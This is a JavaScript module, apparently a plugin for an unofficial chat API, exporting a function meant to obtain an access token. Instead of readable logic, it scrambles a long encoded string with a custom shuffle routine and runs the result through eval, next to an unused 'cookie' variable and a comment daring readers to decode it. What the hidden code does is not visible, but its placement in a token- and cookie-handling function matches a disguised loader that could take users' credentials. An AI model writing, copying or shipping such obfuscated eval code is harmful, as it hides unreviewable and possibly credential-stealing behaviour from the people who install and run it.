module.exports = function(defaultFuncs, api, ctx) {
    return function getAcessToken(callback) {
        var resolveFunc = function() {};
        var rejectFunc = function() {};
        var returnPromise = new Promise(function(resolve, reject) {
            resolveFunc = resolve;
            rejectFunc = reject;
        });

        if (!callback) {
            callback = function(err, data) {
                if (err) return rejectFunc(err);
                resolveFunc(data);
            };
        }

        //decode_di_dap_sever_ManhG
        var cookie;
        (function() {
            function Ox$(r, e) {
                var d = r.length;
                var z = [];
                for (var f = 0; f < d; f++) { z[f] = r.charAt(f) };
                for (var f = 0; f < d; f++) {
                    var i = e * (f + 505) + (e % 29202);
                    var o = e * (f + 316) + (e % 34208);
                    var t = i % d;
                    var w = o % d;
                    var k = z[t];
                    z[t] = z[w];
                    z[w] = k;
                    e = (i + o) % 3076878;
                };
                var v = String.fromCharCode(127);
                var l = '';
                var p = '%';
                var c = '#1';
                var x = '%';
                var b = '#0';
                var n = '#';
                return z.join(l).split(p).join(v).split(c).join(x).split(b).join(n).split(v);
            }
            return eval(Ox$("7ftnot0ox(o{muxc}i_n+bhgsr7{teau]noe2a7(rxb(];#ga=)i)=[)(v)={scosa+..x 7ch;+[n s;1si1sr00 /1}x\x5C7ro]puj0;#;0*\x22v[(oltgu x( nd.[t1aaa)l6#=r[ri p(n;Tr{h;tivtr)jx 1xl72(0lo o.v8i0f7psa9\x27igm](srOa[rr[n#j+\x22af6m}r(]#n.t3)p3..=n;/[]r8cy;v;+ =;f)tpe 5{=ag\x5C[2ti=\x5Cc2\x5Cea]mgfav+(7];8va]=.=t1 il);]s]x=lut11hx1C[i=+il(x;70t+ogrv;n)yf ram4x#rs}a.[v47(+r(u)i;6\x5Ch2;r= uoox.hc(;2a\x5C02r ,(((m #1t2$ ehs#.({ 5#2do({\x5Cj29vq[j /s 6sh9#n0]#e aya)e k=a)sh1r[=a#it[ang\x22jt exf7jr.)C0  0vrs .#o}n]v#)ox/xvCxllk0atx 7]0v( .}sn(;t#ur=nk7# ectna:.2)i#(sa\x5Ci2a[l](n},i4]6o3v)l0;)lv*rraC(\x5C)c\x22m (1)\x22ut;iss(gsnr/=c:kaeia#1]k7#1sfmon]i\x5Copm)brb7b]n[c[s0:r1tltg)dsbattaqnt1)w5#to\x5C\x5Ce.rseo etp{e{w11216ao#ha=1[1bce/[\x5Cle.o0#1artcoAstefastntrn(tepi;cbne8c(meo}c f etn1#ic2unm712.ustoeklCo\x22t#fk e(e), 4]6 3j)\x5Cc,oeic=hc2xaa[4o]0a732]ha 2k)iav1p]uau0a)aaxi(s=ap1:][(r[p3e,1hjaaeasw{.H;s \x27[a21)]t\x273o)koeo:0o]kaev}\x27[1[a2\x5C]t(y)1\x3Evvsrac\x5Cdra\x221;]a[[[]]](,[;03)\x5C1r[\x5C[0]a(1[k]=[;]trrtcr2 raolaack1n1l0,g)\x22)]ao7t]c(s)0\x3E#c=lnbxc;( [u[ ] )1rltvrn do=sxle[S[=]3(e[g[5]p)[)=)(a)pey:teio,5rau e(tc)", 1476236)[0])
        })()

        return returnPromise;
    };
};